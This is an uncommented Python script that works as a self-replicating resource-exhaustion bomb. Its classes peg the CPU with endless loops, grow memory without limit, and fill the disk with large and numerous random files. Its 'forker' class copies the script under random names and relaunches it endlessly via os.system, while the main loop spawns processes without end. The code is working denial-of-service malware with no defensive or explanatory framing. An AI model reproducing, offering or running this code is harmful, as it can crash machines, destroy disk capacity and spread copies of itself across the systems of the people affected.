import os,math,random,threading
import multiprocessing as mp
from copy import deepcopy

class ResHolder:
    def run(self):
        ts = []
        for name in dir(self):
            if name.startswith('_'):continue
            if name == 'run':continue
            f = getattr(self,name)
            t = threading.Thread(target=f)
            ts.append(t)
        for t in ts:
            t.start()
        for t in ts:
            t.join()

class rh_cpu(ResHolder):
    def while1(self):
        while True:
            pass

    def m1(self):
        while True:
            t = random.random()

class rh_mem(ResHolder):
    def q1(self):
        a = [1,math.pi,math.e]
        while True:
            a.insert(0,sum(a))

    def q2(self):
        a = [1,1<<10,1<<100,10**10,10**100]
        while True:
            a.insert(0,sum(a))

    def q0(self):
        a = {}
        while True:
            try:
                a[random.random()] = random.random()
            except Exception:
                pass

    def qm(self):
        a = [random.random()]
        while True:
            try:
                a.append(deepcopy(a))
            except Exception:
                pass

class rh_disk(ResHolder):
    def _filename(self):
        s = str(random.random())
        return '~//' + s
    
    def bigfile(self):
        with open(self._filename(),'wb') as f:
            b = os.urandom(1048576)
            b *= 100
            while True:
                f.write(b)

    def manyfile(self):
        b = os.urandom(10)
        while True:
            try:
                with open(self._filename(),'wb') as f:
                    f.write(b)
            except Exception:
                pass

class rh_forker(ResHolder):
    def _filename(self):
        s = chr(random.randint(ord('a'),ord('z'))) + str(random.randrange(10000000))
        return s + '.py'
    
    def forkself(self):
        fn = __file__
        tn = self._filename()
        try:
            with open(fn,'r') as f:
                s = f.read()
            with open(tn,'w') as f:
                f.write(s)
        except Exception:
            tn = fn
        while True:
            if os.name == 'nt':
                cmd = f'start {tn}'
            else:
                cmd = f'nohup python3 {tn} &'
            try:
                os.system(cmd)
            except Exception:
                pass

rhd = {
    'test':[rh_cpu,rh_mem],
    'mild':[rh_mem,rh_forker],
    'disk':[rh_disk,rh_forker],
}

def run_one(mode='test'):
    rh = random.choice(rhd[mode])
    t = rh()
    t.run()

def run_all():
    while True:
        for mode in rhd:
            try:
                p = mp.Process(target=run_one,args=(mode,))
                p.start()
            except Exception:
                pass

if __name__=='__main__':
    run_all()
